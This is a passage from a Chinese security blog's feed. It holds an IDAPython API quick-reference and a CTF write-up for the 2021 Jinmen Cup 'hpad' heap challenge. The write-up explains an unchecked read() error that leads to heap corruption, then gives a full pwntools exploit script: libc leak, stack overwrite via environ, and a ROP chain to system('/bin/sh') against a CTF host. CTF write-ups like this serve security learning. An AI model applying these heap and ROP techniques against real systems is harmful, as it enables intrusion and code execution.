 # Two FPRs<br>o_shmbme  &#x3D;      ida_ua.o_idpspec2      # SH &amp; MB &amp; ME<br>o_crf  &#x3D;         ida_ua.o_idpspec3      # crfield      x.reg<br>o_crb  &#x3D;         ida_ua.o_idpspec4      # crbit        x.reg<br>o_dcr  &#x3D;         ida_ua.o_idpspec5      # Device control register</p></blockquote><h3 id="idc-get-operand-value"><a href="#idc-get-operand-value" class="headerlink" title="idc.get_operand_value"></a>idc.get_operand_value</h3><blockquote><p>Get number used in the operand</p><p>This function returns an immediate number used in the operand</p><p>@param ea: linear address of instruction<br>@param n: the operand number</p><p>@return: value<br>    operand is an immediate value  &#x3D;&gt; immediate value<br>    operand has a displacement     &#x3D;&gt; displacement<br>    operand is a direct memory ref &#x3D;&gt; memory address<br>    operand is a register          &#x3D;&gt; register number<br>    operand is a register phrase   &#x3D;&gt; phrase number<br>    otherwise                      &#x3D;&gt; -1</p></blockquote><h3 id="idc-next-head"><a href="#idc-next-head" class="headerlink" title="idc.next_head"></a>idc.next_head</h3><blockquote><p>Get next defined item (instruction or data) in the program</p><p>@param ea: linear address to start search from<br>@param maxea: the search will stop at the address<br>    maxea is not included in the search range</p><p>@return: BADADDR - no (more) defined items</p></blockquote><p>通常用于遍历下一条指令，对应的有prev_head</p><h3 id="idc-print-operand"><a href="#idc-print-operand" class="headerlink" title="idc.print_operand"></a>idc.print_operand</h3><blockquote><p>Get operand of an instruction or data</p><p>@param ea: linear address of the item<br>@param n: number of operand:<br>    0 - the first operand<br>    1 - the second operand</p><p>@return: the current text representation of operand or “”</p></blockquote><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><h3 id="idc-get-strlit-contents"><a href="#idc-get-strlit-contents" class="headerlink" title="idc.get_strlit_contents"></a>idc.get_strlit_contents</h3><blockquote><p>get_strlit_contents(ea, length &#x3D; -1, strtype &#x3D; STRTYPE_C)</p><p>Get string contents<br>@param ea: linear address<br>@param length: string length. -1 means to calculate the max string length<br>@param strtype: the string type (one of STRTYPE_… constants)</p><p>@return: string contents or empty string</p></blockquote><blockquote><p># Character-terminated string. The termination characters<br># are kept in the next bytes of string type.<br>STRTYPE_TERMCHR   &#x3D; ida_nalt.STRTYPE_TERMCHR<br># C-style string.<br>STRTYPE_C         &#x3D; ida_nalt.STRTYPE_C<br># Zero-terminated 16bit chars<br>STRTYPE_C_16      &#x3D; ida_nalt.STRTYPE_C_16<br># Zero-terminated 32bit chars<br>STRTYPE_C_32      &#x3D; ida_nalt.STRTYPE_C_32<br># Pascal-style, one-byte length prefix<br>STRTYPE_PASCAL    &#x3D; ida_nalt.STRTYPE_PASCAL<br># Pascal-style, 16bit chars, one-byte length prefix<br>STRTYPE_PASCAL_16 &#x3D; ida_nalt.STRTYPE_PASCAL_16<br># Pascal-style, two-byte length prefix<br>STRTYPE_LEN2      &#x3D; ida_nalt.STRTYPE_LEN2<br># Pascal-style, 16bit chars, two-byte length prefix<br>STRTYPE_LEN2_16   &#x3D; ida_nalt.STRTYPE_LEN2_16<br># Pascal-style, four-byte length prefix<br>STRTYPE_LEN4      &#x3D; ida_nalt.STRTYPE_LEN4<br># Pascal-style, 16bit chars, four-byte length prefix<br>STRTYPE_LEN4_16   &#x3D; ida_nalt.STRTYPE_LEN4_16</p><p># alias<br>STRTYPE_C16       &#x3D; STRTYPE_C_16</p></blockquote><h3 id="获取指定位置值"><a href="#获取指定位置值" class="headerlink" title="获取指定位置值"></a>获取指定位置值</h3><h4 id="idaapi-get-byte"><a href="#idaapi-get-byte" class="headerlink" title="idaapi.get_byte"></a>idaapi.get_byte</h4><h4 id="idaapi-get-word"><a href="#idaapi-get-word" class="headerlink" title="idaapi.get_word"></a>idaapi.get_word</h4><h4 id="idaapi-get-dword"><a href="#idaapi-get-dword" class="headerlink" title="idaapi.get_dword"></a>idaapi.get_dword</h4><h4 id="idaapi-get-qword"><a href="#idaapi-get-qword" class="headerlink" title="idaapi.get_qword"></a>idaapi.get_qword</h4><blockquote><p>Get one byte (8-bit) of the program at ‘ea’ from the database. Works<br>even if the debugger is active. See also ‘get_dbg_byte()’ to read the<br>process memory directly. This function works only for 8bit byte<br>processors.</p><p>get_db_byte(ea) -&gt; uchar<br>    @param ea (C++: ea_t)</p></blockquote><p>不使用调试过程中的值。</p><h4 id="idc-read-dbg-byte"><a href="#idc-read-dbg-byte" class="headerlink" title="idc.read_dbg_byte"></a>idc.read_dbg_byte</h4><h4 id="idc-read-dbg-word"><a href="#idc-read-dbg-word" class="headerlink" title="idc.read_dbg_word"></a>idc.read_dbg_word</h4><h4 id="idc-read-dbg-dword"><a href="#idc-read-dbg-dword" class="headerlink" title="idc.read_dbg_dword"></a>idc.read_dbg_dword</h4><h4 id="idc-read-dbg-qword"><a href="#idc-read-dbg-qword" class="headerlink" title="idc.read_dbg_qword"></a>idc.read_dbg_qword</h4><blockquote><p>Get value of program byte using the debugger memory</p><p>@param ea: linear address<br>@return: The value or None on failure.</p></blockquote><p>使用调试过程中的值。</p><h3 id="获取指定位置开始的bytes"><a href="#获取指定位置开始的bytes" class="headerlink" title="获取指定位置开始的bytes"></a>获取指定位置开始的bytes</h3><h4 id="idc-get-bytes"><a href="#idc-get-bytes" class="headerlink" title="idc.get_bytes"></a>idc.get_bytes</h4><blockquote><p>get_bytes(ea, size, use_dbg &#x3D; False)<br>Return the specified number of bytes of the program<br>@param ea: linear address<br>@param size: size of buffer in normal 8-bit bytes<br>@param use_dbg: if True, use debugger memory, otherwise just the database<br>@return: None on failure<br>         otherwise a string containing the read bytes</p></blockquote><h3 id="修改指定位置的值"><a href="#修改指定位置的值" class="headerlink" title="修改指定位置的值"></a>修改指定位置的值</h3><h4 id="idaapi-patch-byte"><a href="#idaapi-patch-byte" class="headerlink" title="idaapi.patch_byte"></a>idaapi.patch_byte</h4><h4 id="idaapi-patch-word"><a href="#idaapi-patch-word" class="headerlink" title="idaapi.patch_word"></a>idaapi.patch_word</h4><h4 id="idaapi-patch-dword"><a href="#idaapi-patch-dword" class="headerlink" title="idaapi.patch_dword"></a>idaapi.patch_dword</h4><h4 id="idaapi-patch-qword"><a href="#idaapi-patch-qword" class="headerlink" title="idaapi.patch_qword"></a>idaapi.patch_qword</h4><blockquote><p>Patch a byte of the program. The original value of the byte is saved<br>and can be obtained by ‘get_original_byte()’ . This function works for<br>wide byte processors too.</p><p>patch_byte(ea, x) -&gt; bool<br>    @param ea (C++: ea_t)<br>    @param x (C++: uint64)<br>    @retval: true - the database has been modified,<br>    @retval: false - the debugger is running and the process’ memory has<br>                     value ‘x’ at address ‘ea’, or the debugger is not<br>                     running, and the IDB has value ‘x’ at address ‘ea<br>                     already.</p></blockquote><h3 id="修改指定位置开始的bytes"><a href="#修改指定位置开始的bytes" class="headerlink" title="修改指定位置开始的bytes"></a>修改指定位置开始的bytes</h3><h4 id="idaapi-patch-bytes"><a href="#idaapi-patch-bytes" class="headerlink" title="idaapi.patch_bytes"></a>idaapi.patch_bytes</h4><blockquote><p>Patch the specified number of bytes of the program. Original values of<br>bytes are saved and are available with get_original…() functions.<br>See also ‘put_bytes()’ .</p><p>patch_bytes(ea, buf)<br>    @param ea: linear address (C++: ea_t)<br>    @param buf: buffer with new values of bytes (C++: const void *)</p></blockquote><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="idaapi-add-bpt"><a href="#idaapi-add-bpt" class="headerlink" title="idaapi.add_bpt"></a>idaapi.add_bpt</h3><blockquote><p>Add a new breakpoint in the debugged process. \sq{Type, Synchronous<br>function - available as request, Notification, none (synchronous<br>function)}Only one breakpoint can exist at a given address.</p><p>add_bpt(ea, size&#x3D;0, type&#x3D;BPT_DEFAULT) -&gt; bool<br>    @param ea: any address in the process memory space. Depending on the<br>               architecture, hardware breakpoints always be setup at<br>               random address. For example, on x86, hardware breakpoints<br>               should be aligned depending on their size. Moreover, on the<br>               x86 architecture, it is impossible to setup more than 4<br>               hardware breakpoints. (C++: ea_t)<br>    @param size: size of the breakpoint (irrelevant for software<br>                 breakpoints): As for the address, hardware breakpoints<br>                 can’t always be setup with random size. (C++: asize_t)<br>    @param type: type of the breakpoint ( BPT_SOFT  for software<br>                 breakpoint) special case  BPT_DEFAULT  ( BPT_SOFT |<br>                 BPT_EXEC ): try to add instruction breakpoint of the<br>                 appropriate type as follows: software bpt if supported,<br>                 hwbpt otherwise (C++: bpttype_t)</p><p>add_bpt(bpt) -&gt; bool<br>    bpt: bpt_t const &amp;</p></blockquote><blockquote><p>BPT_WRITE &#x3D; cvar.BPT_WRITE<br>BPT_READ &#x3D; cvar.BPT_READ<br>BPT_RDWR &#x3D; cvar.BPT_RDWR<br>BPT_SOFT &#x3D; cvar.BPT_SOFT<br>BPT_EXEC &#x3D; cvar.BPT_EXEC<br>BPT_DEFAULT &#x3D; cvar.BPT_DEFAULT</p></blockquote><h3 id="idaapi-continue-process"><a href="#idaapi-continue-process" class="headerlink" title="idaapi.continue_process"></a>idaapi.continue_process</h3><blockquote><p>idaapi.continue_process()</p><p>Continue the execution of the process in the debugger. \sq{Type,<br>Synchronous function - available as Request, Notification, none<br>(synchronous function)}The ‘continue_process()’ function can be called<br>from a notification handler to force the continuation of the process.<br>In this case the request queue will not be examined, IDA will simply<br>resume execution. Usually it makes sense to call<br>‘request_continue_process()’ followed by ‘run_requests()’ , so that<br>IDA will first start a queued request (if any) and then resume the<br>application.</p></blockquote><h3 id="idaapi-wait-for-next-event"><a href="#idaapi-wait-for-next-event" class="headerlink" title="idaapi.wait_for_next_event"></a>idaapi.wait_for_next_event</h3><blockquote><p>Wait for the next event.This function (optionally) resumes the process<br>execution, and waits for a debugger event until a possible timeout<br>occurs.</p><p>wait_for_next_event(wfne, timeout) -&gt; dbg_event_code_t<br>    @param wfne: combination of  Wait for debugger event flags  constants<br>                 (C++: int)<br>    @param timeout: number of seconds to wait, -1-infinity (C++: int)<br>    @return: either an event_id_t (if &gt; 0), or a dbg_event_code_t (if &lt;&#x3D;<br>             0)</p></blockquote><blockquote><p>WFNE_ANY &#x3D; _ida_dbg.WFNE_ANY<br>“””<br>return the first event (even if it doesn’t suspend the process)<br>“””</p><p>WFNE_SUSP &#x3D; _ida_dbg.WFNE_SUSP<br>“””<br>wait until the process gets suspended<br>“””</p><p>WFNE_SILENT &#x3D; _ida_dbg.WFNE_SILENT<br>“””<br>1: be slient, 0:display modal boxes if necessary<br>“””</p><p>WFNE_CONT &#x3D; _ida_dbg.WFNE_CONT<br>“””<br>continue from the suspended state<br>“””</p><p>WFNE_NOWAIT &#x3D; _ida_dbg.WFNE_NOWAIT<br>“””<br>(to be used with ‘WFNE_CONT’ )</p><p>do not wait for any event, immediately return ‘DEC_TIMEOUT’<br>“””</p><p>WFNE_USEC &#x3D; _ida_dbg.WFNE_USEC<br>“””<br>(minimum non-zero timeout is 40000us)</p><p>timeout is specified in microseconds<br>“””</p></blockquote><p>如果希望程序运行到下一个断点可以这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># continue process，并且等待下一次suspended</span></span><br><span class="line">idaapi.wait_for_next_event(idaapi.WFNE_SUSP | idaapi.WFNE_CONT, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="idc-set-bpt-cond"><a href="#idc-set-bpt-cond" class="headerlink" title="idc.set_bpt_cond"></a>idc.set_bpt_cond</h3><blockquote><p>Set breakpoint condition</p><p>@param ea: any address in the breakpoint range<br>@param cnd: breakpoint condition<br>@param is_lowcnd: 0 - regular condition, 1 - low level condition</p><p>@return: success</p></blockquote><p>可以设置断点为条件断点，并且设置condition，但是无法从这里设置condition的语言，默认是IDC</p><p>目前我还没有找到比较优雅的直接设置python条件断点的方式，只能硬改 bpt_t 中的 elang 来改</p><p>example：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 设置python条件断点</span><br><span class="line">bpt = idaapi.get_bpt(ea)</span><br><span class="line">bpt.elang = &quot;Python&quot; # or &quot;IDC&quot;</span><br><span class="line">bpt.condition = &quot;print(&#x27;Hello World&#x27;)&quot; # 或者再add_bpt之后使用set_bpt_cond改</span><br><span class="line">idaapi.del_bpt(ea)</span><br><span class="line">idaapi.add_bpt(bpt)</span><br></pre></td></tr></table></figure><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="idaapi-set-cmt"><a href="#idaapi-set-cmt" class="headerlink" title="idaapi.set_cmt"></a>idaapi.set_cmt</h3><blockquote><p>Set an indented comment.</p><p>set_cmt(ea, comm, rptble) -&gt; bool<br>    @param ea: linear address (C++: ea_t)<br>    @param comm: comment string   nullptr: do nothing (return 0)   “” :<br>                 delete comment (C++: const char *)<br>    @param rptble: is repeatable? (C++: bool)<br>    @return: success</p></blockquote><h3 id="idaapi-get-name"><a href="#idaapi-get-name" class="headerlink" title="idaapi.get_name"></a>idaapi.get_name</h3><blockquote><p>get_name(ea) -&gt; qstring<br>    @param ea (C++: ea_t)</p></blockquote><h3 id="idaapi-set-name"><a href="#idaapi-set-name" class="headerlink" title="idaapi.set_name"></a>idaapi.set_name</h3><blockquote><p>Set or delete name of an item at the specified address. An item can be<br>anything: instruction, function, data byte, word, string, structure,<br>etc… Include name into the list of names.</p><p>set_name(ea, name, flags&#x3D;0) -&gt; bool<br>    @param ea: linear address. do nothing if ea is not valid (return 0).<br>               tail bytes can’t have names. (C++: ea_t)<br>    @param name: new name.   NULL: do nothing (return 0).   “” : delete<br>                 name.   otherwise this is a new name. (C++: const char *)<br>    @param flags: Set name flags . If a bit is not specified, then the<br>                  corresponding action is not performed and the name will<br>                  retain the same bits as before calling this function.<br>                  For new names, default is: non-public, non-weak, non-<br>                  auto. (C++: int)<br>    @retval: 1 - ok, name is changed<br>    @retval: 0 - failure, a warning is displayed</p></blockquote><h3 id="idc-get-name-ea-simple"><a href="#idc-get-name-ea-simple" class="headerlink" title="idc.get_name_ea_simple"></a>idc.get_name_ea_simple</h3><blockquote><p>Get linear address of a name</p><p>@param name: name of program byte</p><p>@return: address of the name<br>         BADADDR - No such name</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;idapython几乎所有api都有注解，在 path&amp;#x2F;to&amp;#x2F;your&amp;#x2F;ida&amp;#x2F;python&amp;#x2F;2(3)&amp;#x2F; 里面，这里只是做个快速索引。&lt;/p&gt;</summary>
    
    
    
    
    <category term="逆向" scheme="https://ihopenot.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>津门杯2021Writeup</title>
    <link href="https://ihopenot.github.io/2021/05/28/%E6%B4%A5%E9%97%A8%E6%9D%AF2021Writeup/"/>
    <id>https://ihopenot.github.io/2021/05/28/%E6%B4%A5%E9%97%A8%E6%9D%AF2021Writeup/</id>
    <published>2021-05-28T03:49:03.000Z</published>
    <updated>2023-08-24T14:59:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="hpad"><a href="#hpad" class="headerlink" title="hpad"></a>hpad</h2><p>题目开始提供了3中堆块的分配方式：</p><img src="/2021/05/28/%E6%B4%A5%E9%97%A8%E6%9D%AF2021Writeup/image-20210528120748659.png" class="" title="image-20210528120748659"><p>进去看一下，发现my heap + my allocation的时候有一个666后门，应该要从这里入手。</p><img src="/2021/05/28/%E6%B4%A5%E9%97%A8%E6%9D%AF2021Writeup/image-20210528120902260.png" class="" title="image-20210528120902260"><p>gift里面要求解一个奇怪的方程，之后会把bss段上的一个地址泄露给你。</p><p>方程直接用z3解</p><p>然后看他堆块的实现，结构定义如下：</p><img src="/2021/05/28/%E6%B4%A5%E9%97%A8%E6%9D%AF2021Writeup/image-20210528121144285.png" class="" title="image-20210528121144285"><span id="more"></span><p>每次分配会首先看freebin中有没有大小完全符合的块，有就直接分配，否则再从TopChunk分配。</p><p>乍一看程序好像没有什么溢出点。</p><p>在他自己实现的readn函数里</p><img src="/2021/05/28/%E6%B4%A5%E9%97%A8%E6%9D%AF2021Writeup/image-20210528121346470.png" class="" title="image-20210528121346470"><p>v3没有判断-1的error返回值，会导致如果read返回了-1会向前面的地址覆盖。加上之前没有判断申请的空间的大小，导致可以申请一个超过topchunk剩余size的空间，写入超过剩余size的字节进去会导致非法地址。这样可以强行把输入顶到前面覆盖掉上一个chunk的size和next。</p><p>只要覆盖了next就可以控制myHeapInfo中freebin的值，将其指向noteList中的元素的话可以让freebin指向chunk的next指向我们可控的用户空间，只要我们在里面伪造了一个chunk，再申请掉就可以控制靠后的noteList的值，将其指向noteList中别的元素就可以任意控制noteList中的某一个值，从而任意地址读写。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------------------</span></span><br><span class="line"><span class="comment"># exp starts here</span></span><br><span class="line"><span class="comment">#--------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z3solve</span>(<span class="params">qes</span>):</span><br><span class="line">    s = Solver()</span><br><span class="line">    v0 = BitVec(<span class="string">&#x27;v0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">    v1 = BitVec(<span class="string">&#x27;v1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">    s.add(v1 == LShR(v0 ^ ((<span class="number">0x20</span> * v0)), <span class="number">13</span>) ^ v0 ^(<span class="number">0x20</span>*v0))</span><br><span class="line">    s.add(qes == LShR(v1 ^ (v1 * <span class="number">2</span>**<span class="number">29</span>), <span class="number">0xf</span>) ^ v1 ^ (v1 * <span class="number">2</span>**<span class="number">29</span>))</span><br><span class="line">    <span class="built_in">print</span>(s.check())</span><br><span class="line">    rs = s.model()</span><br><span class="line">    <span class="keyword">return</span> rs[v0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">p</span>):</span><br><span class="line">    sla = p.sendlineafter</span><br><span class="line"></span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;question: &quot;</span>)</span><br><span class="line">    qes = <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>])</span><br><span class="line">    ans = z3solve(qes)</span><br><span class="line">    ans = <span class="built_in">int</span>(<span class="built_in">str</span>(ans))</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    p.sendafter(<span class="string">&quot;: &quot;</span>, p64(ans))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;gift&quot;</span>)</span><br><span class="line">    gift = <span class="built_in">int</span>(p.recvline()[<span class="number">2</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">        sla(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">        sla(<span class="string">&quot;: &quot;</span>, content)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">        sla(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">        sla(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> p.recvline()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">        sla(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">        sla(<span class="string">&quot;: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">    base = gift - <span class="number">0x6140</span></span><br><span class="line">    create(<span class="number">0xf00</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    create(<span class="number">0x50</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    create(<span class="number">0xf00</span>, p64(base+<span class="number">0x6168</span>).ljust(<span class="number">0xe7</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    create(<span class="number">0x50</span>, p64(<span class="number">0x60</span>) + p64(base+<span class="number">0x6178</span>))</span><br><span class="line">    create(<span class="number">0x50</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">2</span>, p64(base+<span class="number">0x5fc0</span>))</span><br><span class="line">    libc.address = u64(view(<span class="number">3</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>, p64(libc.address + <span class="number">0x1ef2e0</span>))</span><br><span class="line">    environ = u64(view(<span class="number">3</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>, p64(environ - <span class="number">0x140</span>))</span><br><span class="line">    edit(<span class="number">3</span>, p64(base + <span class="number">0x101a</span>) + p64(libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    poprdi = base + <span class="number">0x2c93</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(environ - <span class="number">0x150</span>) + <span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">    edit(<span class="number">3</span>, p64(poprdi) + p64(base + <span class="number">0x6180</span>))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------------------</span></span><br><span class="line"><span class="comment"># exp ends here</span></span><br><span class="line"><span class="comment">#--------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">    context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">    context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    dbgattach = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(<span class="string">&quot;./hpad&quot;</span>)<span class="comment">#, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="string">&quot;26806&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> local &amp; dbgattach:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    exploit(p)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;hpad&quot;&gt;&lt;a href=&quot;#hpad&quot; class=&quot;headerlink&quot; title=&quot;hpad&quot;&gt;&lt;/a&gt;hpad&lt;/h2&gt;&lt;p&gt;题目开始提供了3中堆块的分配方式：&lt;/p&gt;
&lt;img src=&quot;/2021/05/28/%E6%B4%A5%E9%97%A8%E6%9D%AF2021Writeup/image-20210528120748659.png&quot; class=&quot;&quot; title=&quot;image-20210528120748659&quot;&gt;

&lt;p&gt;进去看一下，发现my heap + my allocation的时候有一个666后门，应该要从这里入手。&lt;/p&gt;
&lt;img src=&quot;/2021/05/28/%E6%B4%A5%E9%97%A8%E6%9D%AF2021Writeup/image-20210528120902260.png&quot; class=&quot;&quot; title=&quot;image-20210528120902260&quot;&gt;

&lt;p&gt;gift里面要求解一个奇怪的方程，之后会把bss段上的一个地址泄露给你。&lt;/p&gt;
&lt;p&gt;方程直接用z3解&lt;/p&gt;
&lt;p&gt;然后看他堆块的实现，结构定义如下：&lt;/p&gt;
&lt;img src=&quot;/2021/05/28/%E6%B4%A5%E9%97%A8%E6%9D%AF2021Writeup/image-20210528121144285.png&quot; class=&quot;&quot; title=&quot;image-20210528121144285&quot;&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>津门杯2021初赛wp</title>
    <link href="https://ihopenot.github.io/2021/05/14/%E6%B4%A5%E9%97%A8%E6%9D%AF2021%E5%88%9D%E8%B5%9Bwp/"/>
    <id>https://ihopenot.github.io/2021/05/14/%E6%B4%A5%E9%97%A8%E6%9D%AF2021%E5%88%9D%E8%B5%9Bwp/</id>
    <published>2021-05-14T13:33:44.000Z</published>
    <updated>2023-08-24T14:54:42.000Z</updated>
    
